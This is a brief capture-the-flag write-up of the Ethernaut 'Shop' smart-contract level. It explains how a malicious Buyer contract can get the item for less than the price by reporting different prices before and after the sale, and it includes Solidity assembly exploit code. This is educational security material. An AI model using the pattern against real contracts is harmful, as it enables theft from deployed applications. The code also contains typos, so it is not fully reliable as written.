# Shop

Difficulty 4/10

Сan you get the item from the shop for less than the price asked?

Things that might help:
Shop expects to be used from a Buyer
Understanding restrictions of view functions

# Solution

Use the `gasleft()` function. Knowing how much gas you sent with the tx and that updating stoage cost 5000 gas. It is easy to figure out if the call was made before storage or not.

# Their solution

Use assembly and make calls to the Shop isSold function

```
function price() exteranl view override returns(uint){
    bool isSold = Shop(msg.sender).isSold();

    assembly {
        let result

        switch isSold
        case 1 {
            result :=0
        }
        default {
            result :=110
        }
        mstore(0x0, result)
        return(0x0, 32)
    }
}
```

# Moral

Contracts can manipulate data seen by other contracts in any way they want.

It's unsafe to change the state based on external and untrusted contracts logic.
